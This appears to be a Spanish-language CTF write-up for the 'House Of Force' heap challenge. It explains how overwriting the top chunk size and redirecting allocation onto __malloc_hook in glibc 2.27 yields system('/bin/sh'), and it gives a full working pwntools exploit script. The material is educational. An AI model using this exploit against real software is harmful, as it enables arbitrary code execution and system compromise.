# House Of Force

```
Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        No PIE (0x3fe000)
    RUNPATH:    b'$ORIGIN'
    Stripped:   No
    Debuginfo:  Yes
```

Este reto presentaba una introducción a la técnica homónima introducida en el *`Malloc Maleficarum`*.

La solucion es sencilla, dado que hay un heap overflow y contamos con glibc = 2.27 no hay verificacion de integridad del top chunk y tenemos los llamados "malloc hooks" para redirigir la ejecucion a pesar de que la GOT es de solo lectura.

Pasos:
1. Calculamos las direcciones de libc base y del top chunk con los leaks que nos brindan.
2. Reservamos un primer chunk y sobreescribimos el campo `size` del top chunk a `0xffffffffffffffff` (-1).
3. Reservamos un segundo chunk de tamaño `target_addr - top_chunk_addr - 0x20` --- siendo target_addr la direccion de `__malloc_hook` --- para posicionar el top chunk en nuestra direccion objetivo.
```
 # Explicacion del calculo
 # Nosotros queremos que new_top = __malloc_hook - len(prev_size) - len(size) = __malloc_hook - 0x10, para que en la proxima asignacion nuestro chunk apunte alli
      new_top = old_top + nb, nb es el numero de bytes reservados (10 bytes de metadata + sizeof(data))
      new_top =  __malloc_hook - 0x10
      __malloc_hook - 0x10 = old_top + nb
      __malloc_hook - 0x10 = old_top + 0x10 + size
      size = __malloc_hook - 0x10 - old_top - 0x10
      size = __malloc_hook - old_top - 0x20
```
5. Reservamos un tercer chunk --- cuyo campo de datos se encuentra en `__malloc_hook` --- y sobreescribimos la direccion del puntero con la direccion de `system`.
6. Reservamos un cuarto chunk con tamaño `binsh_addr`, provocando malloc(binsh_addr) =>  system("/bin/sh").

## Exploit

```py
from pwn import *
r = process("./house_of_force")
libc = ELF("./libc.so.6")

def malloc(size, data):
    r.sendline(b"1")
    r.sendlineafter(b"size:",str(size).encode())
    r.sendlineafter(b"data:",data)

r.recvuntil(b"@ ")
libc.address =  int(r.recv(14),16) - 0x80970

r.recvuntil(b"@ ")
top_chunk = int(r.recvline().strip(),16) + 0xb0

# Overwrite size of the top chunk
malloc(1,b"A"*24 + b"\xff"*8)

# Place new top chunk
evil_size = libc.symbols['__malloc_hook'] - top_chunk - 0x20
malloc(evil_size,b"")

# Overwrite __malloc_hook 
malloc(8,p64(libc.symbols['system']))

# Call system("/bin/sh")
malloc(next(libc.search("/bin/sh")),b"")

r.interactive()
```
